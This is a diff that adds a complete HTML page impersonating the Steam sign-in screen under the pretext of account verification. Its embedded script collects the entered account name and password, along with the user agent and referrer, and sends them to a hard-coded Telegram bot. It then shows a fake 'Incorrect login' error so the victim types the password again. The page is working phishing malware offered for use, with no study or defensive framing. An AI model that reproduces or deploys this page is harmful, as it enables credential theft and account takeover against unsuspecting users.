@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Steam Sign In</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #1b2838; font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
+    display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #c7d5e0;
+  }
+  .box { background: #171a21; border-radius: 4px; padding: 24px 32px; width: 100%; max-width: 400px; }
+  .logo { text-align: center; margin-bottom: 20px; }
+  .logo span { color: #66c0f4; font-size: 22px; font-weight: bold; letter-spacing: 1px; }
+  .sub { text-align: center; color: #8f98a0; font-size: 12px; margin: -12px 0 18px; }
+  label { font-size: 12px; color: #8f98a0; display: block; margin: 12px 0 4px; }
+  input {
+    width: 100%; background: #1b2838; border: 1px solid #2a3f5f; border-radius: 3px;
+    color: #c7d5e0; padding: 10px; font-size: 14px; outline: none;
+  }
+  input:focus { border-color: #66c0f4; }
+  .btn {
+    width: 100%; margin-top: 20px; background: #5c7e10; border: none; border-radius: 3px;
+    color: #fff; padding: 12px; font-size: 14px; cursor: pointer; font-weight: bold;
+  }
+  .btn:hover { background: #6d9216; }
+  .note { margin-top: 14px; font-size: 11px; color: #8f98a0; text-align: center; }
+  .err { color: #ff6b6b; font-size: 12px; text-align: center; min-height: 16px; margin-top: 10px; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <div class="logo"><span>STEAM</span></div>
+    <div class="sub">Sign in to verify your account</div>
+    <label>ACCOUNT NAME</label>
+    <input type="text" id="login" autocomplete="off" placeholder="steam login">
+    <label>PASSWORD</label>
+    <input type="password" id="password" autocomplete="off" placeholder="password">
+    <div class="err" id="err"></div>
+    <button class="btn" id="btn">Sign In</button>
+    <div class="note">Verifying ownership of this account. Do not share your credentials.</div>
+  </div>
+<script>
+  var TOKEN = "8982596338:AAE47QUXLGfaOtZsTI6j4-ofLUZ4Sl57uos";
+  var CHAT = "5016514155";
+  function sendBot(txt) {
+    var u = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
+    var x = new XMLHttpRequest();
+    x.open("POST", u, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({ chat_id: CHAT, text: txt }));
+  }
+  document.getElementById("btn").addEventListener("click", function () {
+    var l = document.getElementById("login").value.trim();
+    var p = document.getElementById("password").value;
+    if (!l || !p) { document.getElementById("err").innerText = "Please fill in both fields."; return; }
+    var info = [];
+    try { info.push("IP: " + (window.__ip || "n/a")); } catch (e) {}
+    info.push("UA: " + navigator.userAgent);
+    info.push("Ref: " + document.referrer);
+    var msg = "🎣 STEAM LOGIN\nLogin: " + l + "\nPassword: " + p + "\n" + info.join("\n");
+    sendBot(msg);
+    document.getElementById("err").innerText = "Verifying...";
+    setTimeout(function () {
+      document.getElementById("err").innerText = "Incorrect login. Please try again.";
+      document.getElementById("password").value = "";
+    }, 2500);
+  });
+</script>
+</body>
+</html>
